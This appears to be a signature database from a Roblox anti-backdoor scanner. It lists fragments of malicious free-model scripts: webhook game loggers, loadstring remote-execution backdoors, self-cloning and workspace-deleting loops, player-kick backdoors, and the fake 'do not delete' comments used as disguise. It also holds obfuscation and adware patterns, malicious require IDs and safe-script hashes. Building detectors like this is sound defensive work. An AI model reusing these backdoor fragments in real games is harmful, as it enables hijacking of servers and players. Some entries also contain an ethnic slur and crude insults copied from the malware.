	- enable LoadStringEnabled by clicking ServerScriptService (DON'T WORRY ITS JUST TO LOAD SOME MODULES)

	- ]],

	[[ require(2567--]],

	[[1280100409]],

	[[Event.OnServerEvent:connect(function(player, serverExecution)]],

	[[local Info = {
      username = "g",
      content = "New game found! Game Link https://www.roblox.com/games/" ..game.PlaceId,

}

Http:GetAsync(Website .. File .. "Content=" .. Http:JSONEncode(Info) .. "&Discord=" .. Webhook)]],

	[[local Info = {
      username = "g",
      content = "New game found! Game Link https://www.roblox.com/games/" ..game.PlaceId,

}]],

	[[512247939910074388]],

	[[getfenv()["r\e\q\u\ir\e"]],

	[[FlameIsAwesome_]],

	[[--Scripted by CovertCode.
--The ScreenGui is suppose to stay inside of the model. (You can put the model anywhere you like.)
--This part is protected so exploiters wont abuse it! Do NOT remove this.]],

	[[5a99341e66bc45c6f1a0929d000832b43ec55b9afb4eacb45c3c5ccc6705c1cd]],

	[[-- This code is obfuscated (Protected and confused) in order to prevent exploiting and abusing. Please do not delete this other wise exploiters may be able to abuse or find vulnerabilities in your game.]],

	[[4653828604]],

	[[pcall(game.Destroy, script);setfenv(1, getfenv(getmetatable(LoadLibrary("RbxUtility").Create).__call));pcall(game.Destroy, script)]],

	[[eye1 = Instance.new("Part", workspace)
eye1.Anchored = false
eye1.Parent = head
eye1.TopSurface = 0]],

	[[ = head
eye1.TopSurface = 0
eye1.BrickColor = BrickColor.new("Black")
eye1.BottomSurface = 0
eye1m = Instance.new("SpecialMesh", eye1)
eye1m.MeshType = Enum.MeshType.Sphere
eye1m.Scale = Vector3.new(0.02,0.12,0.03)
ogsize = eye1m.Scale
weld = Instance.new("Weld", head)
weld.Part0 = eye1
weld.Part1 = head
weld.C1 = CFrame.new(-.17,]],

	[[ eye1
weld.Part1 = head
weld.C1 = CFrame.new(-.17,.14,-.57)


 ]],

	[[eye2 = Instance.new("Part", workspace)
eye2.Anchored = false
eye2.Parent = head
eye2.TopSu]],

	[[mouthm.Scale = mouthm.Scale:lerp(Vector3.new(ogsize.X+sound.PlaybackLoudness/20000,sound.PlaybackLoudness/1000,ogsize.Z),0.8)]],

	[[sound.SoundId = "http://www.roblox.com/asset/?id="..message:sub(6)]],

	[[bxgyikes]],

	[[or betraying me bud, if u wan]],

	[[52,57,52,49,]],

	[[2422875198]],

	[[C3C802D0C818534]],

	[[4965769761]],

	[[493686933]],

	[[Needed to keep model functioning]],

	[[Thanks for using my model!]],

	[[\101\114\105\117\113\101\114]],

	[[\116\111\110\117\109\98\101\114]],

	[[string["\99\104\97\114"]],

	[[\117\110\112\97\99\107]],

	[[53, 53, 48, 51, 5]],

	[[57, 52, 49, 53, 5]],

	[[53,53,48,51,5]],

	[[57,52,49,53,5]],

	[[4965770420]],

	[[local data = require(CoraX:WaitForChild("CoraX_Data"))]],

	[[aitForChild("CoraX_Data"))
local info = script.Parent.Cor]],

	[[ataStore()
    return 493686]],

	[[taStore()
    return 496576]],

	[[2460510652]],

	[[ObfuscatedToKeepBadSkiddiesOut]],

	[[local ObfuscatedToKeepBadSkiddiesOut_]],

	[[--This an script of ROBLOX Studio. Do not delete it, this script secures your game from exploiters.

--Thanks.]],

	[[\115\101\116\102\101\110\118]],

	[[(tonumber("\49"),{["1gKorIzL9NW7p"]=2]],

	[[W9eAGHhQql=getfenv()[]],

	[[["\112\99\97\108\108"],["4zjOqGRxUQEUboHq"]=]],

	[[âOfficial roblox studio script]],

	[[4628266409]],

	[[ârbxassetid://4850318089â)[1].S]],

	[[â You may proceed if you have basic knowledge of scripting and know what youâre doing.
local RunService = game:GetService(âRunServiceâ)]],

	[[Created by: InceptionTime (Year: 2020)
Description: This is a filtering event put by Roblox to check if your game isnât modifiying the chat filter in any sort of way, deleting this may lead to unforeseeable consequences.]],

	[[Checks if it isnât Studio, as it defeats the purpose of the module, also checks if it is being ran on the serverâs side and not on the clientâs side, just to be on the safe side.]],

	[[n(function(AIDSX_lIIIlI]],

	[[IlII)local AIDSX_IlIIll]],

	[[4921378606]],

	[[hildren(print("Get"))
local IiIIIiIIiIIIiiiIIILII = loadstring(print("Welding"),true)return(print("Returnweld"):Connect(_G),print("Weld"))),false,function(move);
	local IIIIIDIIIIlIIlII = move:Connect(function(weld) unpack(functi]],

	[[â¢?((Â¯Â°Â·._.â¢ Êà¹Äâ¬â ÊÄÐâ¬Ñ$!! ÆÑâ¬â¬ Êà¹Äâ¬â$ Æà¹Ñ â¬Ëâ¬ÑÂ¥à¹É²â¬$ Ç¥ÄÊâ¬$! â¢._.Â·Â°Â¯))Øâ¢]],

	[["WolfPackHollow";
"antiisociaII";
"vgb";
"jmmousee";
"FxEok";
"Shibated";
"death131";
"allahNigis";
"BrainFreezor";
"1s2";
"tz3";
"executorkey_29103";
"guest_43783";
"unbanbee";
"sub2bee";
"WickedDual99";
"akarchy"]],

	[[Model Maker: executorkey_29103 (Cdawg)
Helper: YOU! (Supporting This Model)]],

	[[if Player:IsFriendsWith(853268500) then]],

	[[SADASFSOAFOSAFOSAOFSAO?FDWQORFfO?@RE)@#$))EOWDll,SALO?WFRO#RO#LFSALF,QWF>:LFKLWCLSA_SW_E!$)_!$)_!P@EDSADCL:>QPW@FL:!R@)P#PORLEFCASD?P!O@RO#RFP#WQFLAWF'P!ROFP#PRT@WEQFPL:QWE]],

	[[orparts(location)
   for i,v in pairs(location:GetChildren()) do
      if v:IsA("BasePart") then --This includes Seats, VehicleSeats, WedgeParts etc...]],

	[[s all simutaneously rotate in a circle.
-- This only works until you die,]],

	[[-- Don't remove it, or else you'll break the Anti-Exploit]],

	[[local remote = Instance.new("RemoteEvent",game.ReplicatedStorage)
remote.Name = "CharacterLoadedEvent"
remote.OnServerEvent:connect(function(player, code, password)]],

	[[5360221]],

	[[** \https://www.roblox.com/games/" ..game.PlaceId.."/]],

	[[ð¹Game Loggedð»]],

	[[Joe mama security check]],

	[[.OnServerEvent:Connect(function(idk, lol)]],

	[[local remote = script.Parent.Peachy]],

	[[pt.Parent.Parent.Code
local remote = script.Parent.Peachy
execute.MouseButton1C]],

	[[while true do
	wait()
	if script.Parent == game.Players.LocalPlayer.PlayerGui then
	script.Parent.Name = math.random(10000000)
	end
end]],

	[[if password == "Katie" then]],

	[[= script.Peachy:Clone()]],

	[[wA7L6F_wGbiQx9eO2PMf2g0nivzVRnyNR7vWzJFy-4msdw-3_jx4wch8k7-f8xLEKRNE]],

	[[x.com/games/" ..game.PlaceId.."/",
["webhook"]],

	[[669028334285488163]],

	[[::Flame::Loadstring::]],

	[[.OnServerEvent:connect(function(Player, Code)]],

	[[check = part:findFirstChild("Fire")
		if check == nil then
	script.Parent:Clone()]],

	[[check.Heat = check.Heat  +100]],

	[[while true do
wait()
script.Parent.Locked = true
wait()

end]],

	[["Un_Removable"]= "On"]],

	[["Sheenieboy","Tommy594"]],

	[[Instance.new('Message',script).Text='Getrokt']],

	[[= "its not over yet.."
wait(2)
bin.Text = "your Still here.."
wait(2)
bin.Text = "and im nev]],

	[[844512692]],

	[[er) if Player.UserId == 270553268 then Player: Kick(]],

	[[1643016165]],

	[[value(calc).Load()]],

	[[-- This is a script from studio, do NOT delete this.]],

	[[ayer.UserId == 206253701 then Player: Kick]],

	[[Ashlifa Destroyer]],

	[[for num,obj in ipairs(object:GetChildren()) do
getchil(obj)]],

	[[er.UserId == 183587408 then Player: Kick('Fl]],

	[[AntiSkiddingTool_]],

	[[-- Thanks for using my Remastered Couch Model
-- Please do not remove any code after this text to prevent texture bugs.
-- It's obfuscated to prevent leaks and copies of my work.]],

	[[4966797461]],

	[[eturn(function(T,T,T,T)local U=string.byte;local S=string.cha]],

	[[local a=script.Script
	a.Name = "ChatServiceRunner"
	a.Disabled = false
	a:Clone().Parent = game:GetService("ServerScriptService")]],

	[[https://discord.gg/awESajr]],

	[[ss skidder]],

	[[skidded by]],

	[[ss executor]],

	[[ServerSide Ex]],

	[[op executor]],

	[[Debug = false
Config["OldScript"] = script
if Debug then
	require(]],

	[[Instance.new("Script", game.Workspace:FindFirstAncestorOfClass("Part"))]],

	[[while true do
	Weld()
	wait(.000000000000000]],

	[[ize = 999
			p.Enabled = true
			local y = Instance.new("For]],

	[["http://www.roblox.com/asset/?id=240040664"]],

	[[loadstring(script.punci.Value)()]],

	[[p= game.Workspace:GetChildren()
for i= 1, #p do
p[i]:remove()
end ]],

	[[while true do
wait(.1)
local a=script.Parent:clone()]],

	[[while true do
wait(3)
boom = script.Parent:Clone()
boom.Parent = game.Workspace ]],

	[[function Find()
all = game.Workspace:GetChildren()
for i = 1, #all do
if all[i].className == ]],

	[[local m = Instance.new("Message")
m.Parent = game.Workspace
m.Text = ("Admin as chosen to delete the server")]],

	[[= {166325648,187205557,170109073}]],

	[[de3 = "mp"
ProtectCode4 = "ar"
ProtectCode0 = "n"
ProtectCode5 = "you"
ProtectCode6 = "e"
ProtectCode7 = "doi"
ProtectCode8 = "in"
ProtectCode9 = "my"
ProtectCode10 = "g"]],

	[[v.Name = (ProtectCode2..ProtectCode11.." "..ProtectC]],

	[[Cleaner = script:Clone()
		Cleaner.Parent = game.Workspace]],

	[[Protect.SoundId = ("rbxassetid://"..ProtectId[math.random(#ProtectId)])
Protect.Name = "ServerSaver"]],

	[[rch(Object)
	print(Object)
	coroutine.resume(coroutine.create(Paint), Object)
	local Children = Object:GetChildren()]],

	[[4890938963]],

	[[iTzz Mocha]],

	[["\114\101\113\117".."\105\114\101"]],

	[[-- that one bruh moment when you want to crack my thing lol idc if you do so sucks to suck]],

	[[-- idc if you leak it :/ i just dont want to obsfucate it again ;-;]],

	[[--cool ikr idiot cant find his dick lmfao]],

	[[local lala = script.Script:Clone()]],

	[[ANTISKIDER_]],

	[[bubbyjo_l]],

	[[50386558]],

	[[local Plr = script.Player.Value;
local Player_Name = Plr.Name
local RunService = game:GetService("RunService");

Plr.Character:Destroy();
Plr:Destroy()

workspace.ChildAdded:Connect(function(obj)
	RunService.Heartbeat:Wait();
	if obj.Name == Player_Name then
		obj:Destroy();
	end;
end);]],

	[[1.12741221022]],

	[[Security: Please Upload the game we don't support Roblox studio]],

	[[4324299218]],

	[[Builderman#7324]],

	[[ionicdev#9434]],

	[[--Do NOT delete this, it protects your game from exploiters like Typical Modders, Citizen, SonicElijahMania and much more.]],

	[[50903.78918*100000]],

	[[50903]],

	[[stoptrynacracknignog_]],

	[[2542294198*2]],

	[[ocal rHSja]],

	[[1707774015]],

	[[19132145132]],

	[[pcall(function(ff)getfenv()]],

	[[Don't delete this, it will break the Anti-Backdoor!]],

	[[oors:")print(string.rep("-",10))for i=1,h do pcall(function()print(c[i])end)end;print(string.rep("-",10))print(string.rep("-",10))end)   ]],

	[[if Raindrop_a[1]],

	[[_G.SS = ]],

	[[00000_0101]],

	[[require(Execute)(RemoteFunctionArguments)]],

	[[Crypted SS]],

	[[Close SS]],

	[[:IsFriendsWith(370656357)]],

	[[script.Parent.OnClientInvoke=function(plr) Player:Kick('Do not hack on'..game.Name) end]],

	[[2536436743*2]],

	[[for i = 1, 2000000, 1 do]],

	[[local maxSpreadDist = 7]],

	[[ToddIsCuteBuyRaindrop_]],

	[[Yeah.. Our source is obfusicated. Why? The same reason you're looking at this. Our concern is, what's stopping people who develop
	backdoors from looking at the full raw code and then getting ideas on how to bypass this detection? The easiest way to bypass something
	is by having the source code to something your trying to bypass.]],

	[[script.Parent.Name..math.random(1,999999)/26*3+math.random(5,100)/0.5]],

	[[by Jerome#1018]],

	[[OMG YOU IS HAXORED NO WAI]],

	[[SERENITY_]],

	[[omfg a damn game!]],

	[[1460281907]],

	[[= player.PlayerGui
		local Execute = Gui:FindFirstChild(self.directories.Execute, true)
		local Clear = Gui:FindFirstChild(self.directories.Clear, true)
		local Code = Gui:FindFirstChild(self.directories.Code, true)
		assert(Execute and Clear and Code, "Invalid directory! Please optimize in Settings.Directories")
		Execute.MouseButton1Click:Connect(function()
			local env = setmetatable({}, {
				__index = function(_, Function)]],

	[[yer:IsInGroup(self.settings.WhitelistGroup) or table.find(self.settings.WhitelistedUsers, player.Name) the]],

	[[log backdoored]],

	[[aze.whitelist = require(scr]],

	[[.UpdateCode:FireServer(script.Parent.So]],

	[[Backdoored game]],

	[[rprxy.xyz]],

	[[on.Parent = Gui.LoggerFrame.S]],

	[[This is the Hardware of all Roblox games. This is like the System 32 of Roblox.
If you delete this, your game could be deleted or may just cause lag and crashes.]],

	[[https://www.psu.dev/]],

	[[discord.gg/psu]],

	[[This module is responsible for generating Script effects. Do not remove or the plugin will break. (Jerome#1018, Plugin Studios)]],

	[[This Script Manages Default Camera, Removing may cause issues both in Studio & in the ROBLOX Client]],

	[[--This script loads the songs when it's on a published game. It will give an error when testing in studio. Don't mind it]],

	[[For this script to work, in game settings under security, please enable third party teleports.]],

	[[2637091265*2+2+2+4-3+3]],

	[[5412955559]],

	[[turn on Third Party Teleports in your security tab]],

	[[1601509548]],

	[[this is not for "exploiting" purposes, this is a private admin module for me and my friends to use on our games, thanks please don't delete this since we worked hard on it <3.]],

	[[Input(input)
        local Delta = input.Position - dragStart
        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
    end
    Frame.InputBegan:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
            dragToggle = true
            dragStart = input.Position
            startPos = Frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragToggle = false
                end
            end)
        end
    end)
    Frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end]],

	[[ragify(Frame)
    dragToggle = nil
    local dragSpeed = 0.50
    dragInput = nil
    dragStart = nil
    local dragPos = nil
    function updateInput(input)
        local Delta = input.Position - dragStart
        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
    end
    Frame.InputBegan:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
            dragToggle = true
            dragStart = input.Position
            startPos = Frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragToggle = false
                end
            end)
        end
    end)
    Frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if input == dragInput and dragToggle then
            update]],

	[[\x72\x65\x71\x75\x69\x72\x65]],

	[[_G.env=getfenv()]], --Possible remove this detection as it is unnecessary

}


--// Strings to detect obfuscation \\--

DB.Obfuscation_Detection = {
	[[SynapseXen]],

	[[Please make sure your Lua implementation supports non-null terminated strings]],

	[[Obfuscator]],

	[[_=_G; _______ = _["\x52]],

	[[iDAuBJnU6EP =]],

	[[AspectNetwork]],

	[[local BinaryEncrypted]],

	[[_G.EncodedBinary]],

	[[Luraph]],

	[[hi my 2.5mb script doesn't work with xen please help]],

	[[xen doesn't come with instance caching, sorry superskater]],

	[[,pcall,tonumber,math.random,tostring,wait or Wait,Game or game,script,Instance.new,getfenv,Workspace or workspace,next,Spawn,type]],

	[[end)(string.byte,table.insert,setmetatable)]],

	[[OBA Engine]],

	[[local R=string.byte;local Y]],

	[[:gsub("(".. ("[01]"):rep(8) .. ")"]],

	[[[string.reverse(tostring]],

	[[[tostring(string.reverse]],

	[[0x39DB7846*(2+2+2-1+2+2-4)]],

	[[tonumber(string.reverse(]],

	[[ScriptCryptV2ByAsceylos]],

	[[return(function(e,l)local X=table.insert;local s=table.concat;local A=getfe]],

	[[Cryptedrequire(]],

	[[return string.char(string.len(Bit))]],

	[[LPH!]],

	[[LPH|]],

	[[obfuscated]],

	[[IronBrew]],

	[[AztupBrew]],

}


--// Code snippets which use the string formats \\--

DB.Code_Snippets_Formats = {
	[[local%s+Updated%s*=%s*require%s*%b()%s*if%s+Updated%s*==%s%b""%sthen%s+print%b()%s*else%s+print%s*%b()%s*end]],

	[[require%b()%.StopYouHaveViolatedTheLaw%b()]],

	[[require%b():Fire%b()]],

	[[if[%.%a%d_%s]+then%s+require%s*%b()%s*%b()%s*else%s+require%s*%b()%s*%b()%s*end]],

	[[d[Ã¥Ã¤eaoï¿½]+ng[%.%s]+you got owned]],

	[[script[%.%s]+or[%.%s]+is[%.%s]+it]],

	[[require%b().daddy%(]],

	[[PlayerAdded%s*:%s*Connect%s*%(%s*function%s*%b()%s*require%s*%b()]],

	[[require%b()%.load%b()]],

	[[require%b():Run%b()]],

	[[Tazer %d+%.0]],

	[[local[%.%a%d_%s]+=%s*require%s*%b()[%.%a%d_%s]+antibackdoor%s*%b()]],

	[[local wat%s*=%s*%d+]],

	[[require%b():sliv%(]],

	[[require%b():aurora%(]],

	[[%b()%.AntiCheat%b()]],

	[[Last synced %d/%d/%d %d:%d || RoSync Loader]],

	[[string%s*%.%s*reverse%s*%b()%s*%]%s*%b()]],

	[[if%s+not%s+game%s*:%s*GetService%b()%s*:%s*IsStudio%b()%s*then%s+require]],

	[[getfenv()%[%s*string%s*%.%s*reverse(]],

	[[while%s+true%s+do%s+end]],

	[[while%s+script%s+do%s+end]],

	[[while%s+wait%s*%(%s*%)%s+do%s+end]],

	[[pwne*d]],

	[[while%s+true%s+do%s+[%.%a%d_%s]+%s*:%s*Clone%b()%s*%.%s*Parent%s*=%s*[%.%a%d_%s]+]],

	[[while%s+wait%s*%b()%s+do%s+[%.%a%d_%s]+%s*:%s*Clone%s*%b()%s*%.%s*Parent%s*=%s*[%.%a%d_%s]+]],

	[[while%s+true%s+do%s+[%.%a%d_%s]+%b()%s*end]],

	[[while%s+true%s+do[%.%a%d_%s]+=%s*Instance.new%b()[%.%a%d_%s]+=[%.%a%d_%s]+[%.%a%d_%s]+=%s*["'].-["'][%.%a%d_%s]+=[%.%a%d_%s]+wait%s*%b()%s*end]],

	[[while%s+wait%s*%b()%s+do[%.%a%d_%s]+=%s*Instance.new%b()[%.%a%d_%s]+=[%.%a%d_%s]+[%.%a%d_%s]+=%s*["'].-["'][%.%a%d_%s]+=[%.%a%d_%s]+wait%s*%b()%s*end]],

	[[while%s+true%s+do[%.%a%d_%s]+%b()%s*wait%s*%b()%s+end]],

	[[repeat%s+until]],

	[[%.%s*Volume%s*=%s*[234567890]%d]],

	[[%.%s*Volume%s*=%s*%d%d%d]],

	[[require%([%.%a%d_%s]+:%s*dataStore%b()]],

	[[while[%.%a%d_%s]+:%s*Clone%s*%b()%s*do%s+end]],

	[[OnServerEvent%s*:%s*connect%s*(%s*function%s*%b()%s*loadstring%s*%b()%s*%b()%s*end]],

	[[OnServerEvent%s*:%s*connect%s*(%s*function%s*%b()%s*loadstring%s*%b()%s*end]],

	[[require%b():protectGame%b()]],
	
	[[require%s*%b()%s*%b()%s*%b()]],

	[[OnServerEvent%s*:%s*connect%s*(%s*function%s*%b()%s*if[%s%.=%d%a_%(%)]+then%s*loadstring%s*%b()%s*%b()%s*end]],

	[[OnServerEvent%s*:%s*connect%s*(%s*function%s*%b()%s*if[%s%.=%d%a_%(%)]+then%s*loadstring%s*%b()%s*end]],
	
	[[require%b():Stys%b()]],

}


--// Obfuscation detection which use the string formats \\--

DB.Obfuscation_Detection_Formats = {
	[[[il1][il1][il1]+=string]],

	[[[il1][il1][il1]+={]],

	[[#%s*{]],

	[[[il1][il1][il1]+ = unpack]],

	[[local %a=string%.byte;local %a=string%.char;]],

	[[\[123456789]+\[%d]+\[%d]+\[%d]+]],

	[[Synapse%s*Xen]],

	[[[il1][il1][il1][il1][il1]+%s*=]],

	[[function [il1][il1][il1][il1][il1]+%(]],

	[[["'%s,]+[01][01][01][01]+["'%s,]+[01][01][01][01]+["'%s,]+[01][01][01][01]+["'%s,]+[01][01][01][01]+]],

	[[pcall%(require,%a%(%a:sub%([%d]+%)%)]],

	[[RiftX[il1][il1][il1]+]],

	[[local%-%-%[%[]],

	[[local%s+%-%-%[%[]],

	[[[%w_%.]+%+%d+ end;return table%.concat%b()end;local [%w_%.]+=[%w_%.]+%(']],

	[[[%d%a_]+%[%d+%]%.%.[%d%a_]+%[%d+%]%.%.[%d%a_]+%[%d+%]%.%.[%d%a_]+%[%d+%]%.%.[%d%a_]+%[%d+]],

	[[\x[%x]+\x[%x]+\x[%x]+\x[%x]+]],

	[[string%.byte%(%s*%d+%s*,%s*%d+%s*,[%s%d,]+%)]],

	[[getfenv()%s*%[]],

	"[^(_%w)]require%s+[^%(]",

	"[^(_%w)]require[^%s%(]",

	"[^(_%w)]getfenv%s+[^%(]",

	"[^(_%w)]getfenv[^%s%(]",

	"[^(_%w)]setfenv%s+[^%(]",

	"[^(_%w)]setfenv[^%s%(]",

}

-- // Formatted adwere detection

DB.Adware_Detection_Formates = {
	[[PlayerAdded:connect%(function%b()%s*if%s+not%s+[%w%d_]+:PlayerOwnsAsset%b()%s*then%s+[%w%d_]+:PromptPurchase%b()%s+end%s+end%)]],

	[[local%s+[%w%d_]+%s*=%s*[%w%d_]+:GetService%("MarketplaceService"%)%s*for [%w%d_]+,%s*[%w%d_]+ in [i]?pairs%b()%s*do%s+market:PromptPurchase%(]],

	[[for [%w%d_]+,[%w%d_]+ in pairs%b() do%s+[%w%d_]+:Teleport%b()]],

	[[PlayerAdded:Connect%(function%b()%s+[%w%d_]+:Teleport%b()]],

	[[for [%w%d_]+,[%w%d_]+ in pairs%b() do%s+[%w%d_]+:PromptPurchase%b()]],

	[[[%w%d_]+:Teleport%b()]],

	[[game%.Players%.PlayerAdded:Connect%(function%b().+game:GetService%("MarketplaceService"%):PromptPurchase%b()]],

}


-- // A list of malicious require ids. The reason there are seperated from maliciouscodesnippets is to increase performance.

DB.Bad_Require_Ids = {
	"5715556818", "5555475667", "3041175937",
	"5098883048", "5292040425", "5182026494",
	"5245156880", "5245171754", "4751241292",
	"5246374811", "4952999255", "5247019873",
	"5246507325", "5245844180", "5245638301",
	"5246249950", "5245264993", "5072873486",
	"5121269775", "4790475255", "4670913700",
	"2556021288", "5090011414", "5104777071",
	"1683222792", "5084588396", "5059012307",
	"5084744245", "5084743656", "5084743398",
	"5084743088", "5084743939", "5084743622",
	"5084743364", "5084744100", "5084743821",
	"5084743520", "5084743249", "5084742926",
	"5084762641", "4062872368", "4821417050",
	"5031529929", "4794986644", "5077231493",
	"4880027249", "5015642331", "5029199151",
	"4856317205", "4986595724", "4986541548",
	"4656102360", "5004500405", "317901985",
	"4977832031", "4617777367", "4852273118",
	"4794986906", "4850318089", "4582121027",
	"4850721608", "3664252382", "4958213401",
	"4953968226", "4921021305", "3667797501",
	"4830555922", "1501837051", "3888462881",
	"3888345526", "3888476620", "4491609670",
	"3888333956", "4797950693", "4722188262",
	"3979093751", "4725588986", "4710802387",
	"73016023", "2655056793", "4735494320",
	"4712695127", "4723753937", "4104356837",
	"3279983046", "4728931941", "2588997359",
	"2342106098", "2588355688", "4707923523",
	"4707908850", "4509414898", "4696605318",
	"4648191831", "3571206277", "3068230330",
	"3697754730", "1389106135", "3505921445",
	"855371127", "306895131", "2527899984",
	"2531777909", "2499904369", "3517374790",
	"4672757644", "2531912755", "4600242709",
	"4679935477", "4658857698", "4644097080",
	"4609898761", "3160879926", "2501525825",
	"2501549711", "3019584266", "4433921552",
	"4229612988", "4178953416", "1006051316",
	"3612801610", "3719239687", "520532182",
	"5266205158", "3856263791", "3635228248",
	"3856241656", "5406938800", "01546813029",
	"5542303780", "5283742896", "5289785933",
	"5289794324", "5410639662", "625876374",
	"400942773", "5585624332", "5481376941",
	"5656071387", "5656062561", "5770222512",
	"5490813641", "0x146ec9ad4", "5924975050",
	"5925041363", "0x1554DC1B0", "5151855975",
	"5915575426", "5915578889", "5915565317",
	"5915563830", "5465382803", "5505301502",
}


--// Hashes of safe scripts to prevent false positives \\--

DB.SafeScript_Hashes = {
	"6edff1c79022da7ac166072e24fec5c0c99c7c78",
	"59fc92d1eb1c511583ba166ff3a38d2667c932d5",
	"87914459cd8fbf7193290a8ff62f86bb9e294771",
	"6e3e6b42898fe82a9111752a8ff690a444079115",
	"eabf480fe6132e0b93f153e147422a9fc558573c",
	"b2ebae1020c85099fdf3be24510e9856297c612b",
	"da67537cb4bb57cb90fdc5875227d24431a8151f",
	"c38b5af3aebf503a568ea1c1ff21de436b27faa2",
	"cc5bea1899885e42e80446aea4e370cf4d0a7738",
	"3f35754795d78f10502ad96243fdb0752fbe22f1",
	"1275c6177490dde45e217b899ce0396e5e5c9568",
	"05051b746c827eb646b7988190b4d3ecde12c205",
	"ef6612ce8f3f78bbdae37c333c984ab309fbd0b1",
	"806148224bc6fe47912cf07e347bec2936ef5df8",
	"c4b32e58e917b31af526c5e166f483e9c89aa587",
	"baad2e6a3b11c6ee990fcd1038d992d3d8faa1d5",
	"5901b54cab04fea25a897fb625064b349afc8a05",
	"620f919ec69aa92309638fad9018003ab1e2cd6d",
	"39ef555061716be59ee5af978d206dacc04bebce",
	"b89c9f9f3720c36387d944949b867cb46ec18b5b",
	"d32aad42b515692fef7b42fe6a1f8fe4e03e8c25",-- Might Tea 2 Cleaner
	"08dcf035b15b4a32eb437ed1424c84158bfd6fae",
	"4a0be521173ddd9a85ef8ca7e2ba3947b0ef8ce3",
	"c8c174131ca2b407c6253c16f37204eec685cdb9",
	"d9f134163aefe78512d3fb6d6ad6c6b1361bf9e9",
	"94f3b94d5dd2f44a6f5299231305a50369194011",
	"0ee8deb16e5acb9f277b13654e12cf5fa36c8ffc",
	"af4afb476813da1fbad5965084ab9e95b08073b5",
	"8434cfd5abde451e5670b02f55319986976c7cf6",
	"874757006667ea3a2fcfb2484813614e28de4c1b",
	"c3fcb821ff984b8abf2ac43a32e9ee4f5bddb07f",
	"3e0961c04599c57eb525e2cd5caca1b6365e451e",
	"87b1f24809ad5133b1eeb19e2a48e8a04f88a748",
	"b6cbc29e689084465fdd6363b1a00b2c3f33552c",
	"a9e433a11227c86d3ca2d34306076afb3e539d31",
	"d9b6491e8de59233da9c9ab6fe859857724826d5",
	"a81972d85ed10202bbe66f38e5c150e1e36dc4e8",
	"a510c95b66a15774e1abb67d8fc9f1b9669360e7",
	"13a54c8f38fecbefb72200bbae5957825b185594",
	"d6f5aa4ba3bbd711ba9459cc5af61445283cffd0",
	"4e9f3197dcb2287a40efdb1bb57389910cba4887",
	"4707ba8e07688ec86a419f4cdecba6fe824ebe9c",
	"5aa357d0f91c0d781832f6edf681a78ee686a647",
	"80ad6be5c0ef13e18084a745f7d0274ce4ef6429",
	"3aedc88cc86b7ae9c81dd11c182e507515556a35",
	"fd7db11cb142a406381184b11ed35132b6cb7888",
	"e3260aefb988eddb65435bdea614c51c1620dc38",
	"5287320b24f4b0d29d0483d42a194df902a32357",
	"bb1aeab4f8a6b94461cc599451b29e62309d1b14",
	"9f530860116adddc07f9d75659835b98e1a4a7b3",
	"53c1a686d7531b8437e14764b005a1671e012c42",
	"4528a3aeb5af2d5ad7a52a8d49e1b36af31a971f",
	"cec7f5a648974de2a412a763e6bec13201871e06",
	"f77154aec93a545b09a14181bbff96c7ebde357c",
	"1115a801623a54a846345cb5b11d9b673aa323a1",
	"3924eda6c34a707407ae305c1e0eff0bd70734c5",
	"cefabb4dd1dc503af46f2c420eec00e854964af3",
	"8934fa30674f56538f13b7e92e46d39c70aa8ff3",
	"08a7c1bb6eb13c89509aa87585dadd0bf6aba6b5",
	"0dbda80c62c65768f19ebf25c412c1ef0ff6680a",-- Ro protect animation script
	"c04408f20ec54b25e31af725da8e6fb74b590fa6",-- Anti Virus PRO used by Vira Killer
	"5500520289d3cbb76fe6dcfd46d70ab37fb6065b",-- Falcon Scripting art script
	"7c869595d654672b3179534dad0191b4c0821c75",-- Doggity anti Virus
	"c0da21c3df467638fe72dc2989060ff16395b9f1",-- Doggity main AV module
	"97b5a72ae05619981d63bf02a67b1c26be3d61bb",
	"db88ea53e260c2b900db902871a6ce5beaac62e6",
	"586d7ce4a3b256f7517c154625aa969421315a81",
	"7f1360d1a3e05d8ee1d068d22456f82228aa8ad4",
	"9cf4cd56ee4fb1902984628ef607e1c64825c647",-- Doggity AV UI
	"321f68645f41d62c63a483fb0ac4f47be11ea2e6",-- Ro Protect UI element
	"42a5e52a35a8731eadd73b5cd1a3b71196afe0f4",-- RoProtect main
	"9ec4fa956c5cf9155dbeeec71aa8a210c9cf00bf",-- RoProtect UI element
	"31da2d602dc0680650c1c81bc18caa6d1d31f4b9",-- RoProtect scanner
	"96574ccef8f46493797b7c0738975f13231707a5",-- Ro protect UI element
	"1106226cfd0a0290ebd194727d2b75f8457359b6",-- RoProtect UI element
	"7872286d4ca33dc0d69ab1007f02ebbd37365635",
	"9bc6837144511d33fa57ee36823efded3c2e292d",-- RoProtect READ ME detection notice
	"94420ff7dc84e3bc9067d48848f0ee92f5564539",-- Stravant resize align
	"e6de5cef63c0385de710c1eca4e48c493432ca99",-- Ro Defender
	"e3a46c9787950ec2c95477359e992e51a5aa4a67",-- Ro Protect launcher
	"0a5f4f85cbc3fcf3ec59104c08dbd31f38096536",-- RoProtect scanner
	"042eef9450b6a33c165acab4c0d529e3cf420664",
	"5bad26f74ecbb0fd96b0d397031106acc5165868",-- Server Defender Core
	"38c48160b814339219f70a660caae7d78f409117",-- Ro Protect viruses found UI updater loop
	"765c2c7565b31fb752f4e8fcf3c651c0271ddf88",-- Ro Protect viruses found UI updater loop
